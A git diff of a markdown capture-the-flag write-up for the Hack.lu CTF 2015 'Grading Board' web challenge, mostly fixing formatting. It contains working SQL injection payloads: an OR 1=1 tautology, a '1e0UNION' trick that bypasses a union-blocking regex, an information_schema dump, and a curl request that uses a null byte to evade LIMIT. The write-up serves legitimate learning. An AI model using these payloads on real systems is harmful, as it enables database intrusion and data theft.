@@ -25,9 +25,9 @@ The account for signing in is given in the problem description. After login, the
 After taking a look at the patch file, I saw following sql code:
 <pre>
 <code>
-select id, first\_name, last\_name from students
-WHERE first\_name='$name'
-   OR last\_name='$name' ORDER BY id ASC LIMIT 5;
+select id, first_name, last_name from students
+WHERE first_name='$name'
+   OR last_name='$name' ORDER BY id ASC LIMIT 5;
 </code>
 </pre>
 
@@ -39,21 +39,21 @@ select id, first\_name, last\_name from students
 </code>
 </pre>
 
-After trying "**OR 1=1 #\**" as input, the SQLi worked.
+<br>After trying "**OR 1=1 #\**" as input, the SQLi worked.<br>
 ![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/4.png)
 
 Also, the patch tried to disable union SQLi by regex: [^a-zA-Z0-9\_]union[^a-zA-Z0-9\_]<br>
 But we still have some ways to bypass the limitation.<br>
 [Union Bypass Reference](https://github.com/client9/libinjection/blob/master/data/sqli-rsalgado-bhusa2013.txt)<br>
-In the reference, it showed that SQL syntax still worked with content "OR 1=1**e0**Union...". We could use this trick to bypass the above limitation.
+In the reference, it showed that SQL syntax still worked with content "OR 1=1**e0**Union...". We could use this trick to bypass the above limitation.<br>
 
 In the patch, it told us how the table name was generated and all the column names we had in the table, but it was also easy to use information\_schema to get all the information we needed. Just entered following input:
 <pre><code>
-AND 1=1e0UNION SELECT table\_schema, table\_name, column\_name FROM information\_schema.columns#\
+AND 1=1e0UNION SELECT table_schema, table_name, column_name FROM information_schema.columns#\
 </code></pre>
 
 ![github](https://github.com/st9140927/writeup/blob/master/Hack.lu CTF 2015/Grading Board [web] 300/5.png)<br>
-The table name and column name were there!
+The table name and column name were there!<br>
 
 And then we entered following input:
 <pre><code>
@@ -69,7 +69,7 @@ After summiting the token, I got the flag. :)<br>
 Note:<br>
 It's also able to bypass the limit of "LIMIT 5" by using null byte. We can modify our input as following and use curl to send our post request:
 <pre><code>
-curl -X POST --data "name=AND 1=1e0union select table\_schema, table\_name, column\_name FROM information\_schema.columns;%00\&site=default&action=search" https://school.fluxfingers.net:1506/
+curl -X POST --data "name=AND 1=1e0union select table_schema, table_name, column_name FROM information_schema.columns;%00\&site=default&action=search" https://school.fluxfingers.net:1506/
 </code></pre>
 And you can get the whole results instead of 5 columns only.
 
